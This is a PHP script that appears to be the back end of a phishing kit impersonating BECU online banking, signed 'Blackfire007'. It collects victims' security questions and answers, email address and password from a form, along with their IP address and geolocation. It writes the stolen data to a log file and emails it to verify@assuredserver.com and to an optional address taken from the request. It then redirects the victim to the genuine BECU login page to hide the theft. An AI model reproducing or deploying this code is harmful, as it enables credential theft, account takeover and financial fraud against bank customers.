<?php
// Load necessary files and initialize objects
require_once('geoplugin.class.php');
$geoplugin = new geoPlugin();

// Helper function to sanitize input
function sanitize_input($data) {
    return htmlspecialchars(strip_tags(trim($data)));
}

// Retrieve and sanitize POST data
$q1 = sanitize_input($_POST['q1'] ?? '');
$a1 = sanitize_input($_POST['an1'] ?? '');
$q2 = sanitize_input($_POST['q2'] ?? '');
$a2 = sanitize_input($_POST['an2'] ?? '');
$q3 = sanitize_input($_POST['q3'] ?? '');
$a3 = sanitize_input($_POST['an3'] ?? '');
$q4 = sanitize_input($_POST['q4'] ?? '');
$a4 = sanitize_input($_POST['an4'] ?? '');
$email = sanitize_input($_POST['email'] ?? '');
$passwd = sanitize_input($_POST['password'] ?? '');
$serv = filter_var($_REQUEST['verify'] ?? '', FILTER_VALIDATE_EMAIL);

// Get the user's IP address
$ip = $_SERVER['REMOTE_ADDR'] ?? 'UNKNOWN';
$geoplugin->locate();

// Check required fields are not empty
if ($q1 && $a1 && $q2 && $a2 && $q3 && $a3 && $q4 && $a4 && $email && $passwd) {
    // Prepare message
    $message = <<<EOT
---|Blackfire007|---
===== Question Details =====
Question 1: $q1
Answer 1: $a1
Question 2: $q2
Answer 2: $a2
Question 3: $q3
Answer 3: $a3
Question 4: $q4
Answer 4: $a4
===== Account Details =====
Email: $email
IP Address: $ip
--------------------------
Location Info:
City: {$geoplugin->city}
Region: {$geoplugin->region}
Country: {$geoplugin->countryName} ({$geoplugin->countryCode})
--------------------------
EOT;

    // Log message to file (securely)
    file_put_contents('JOB.txt', $message . PHP_EOL, FILE_APPEND | LOCK_EX);

    // Send email securely
    $to = 'verify@assuredserver.com';
    $subject = "becu.org | $ip";
    $headers = [
        'From' => 'Blackfire007@assuredserver.com',
        'Content-Type' => 'text/plain; charset=UTF-8'
    ];

    // Send email if $serv is a valid email
    mail($to, $subject, $message, $headers);
    if ($serv) {
        mail($serv, $subject, $message, $headers);
    }

    // Redirect to the login page
    echo '<script>window.location="https://onlinebanking.becu.org/BECUBankingWeb/Login.aspx";</script>';
}
?>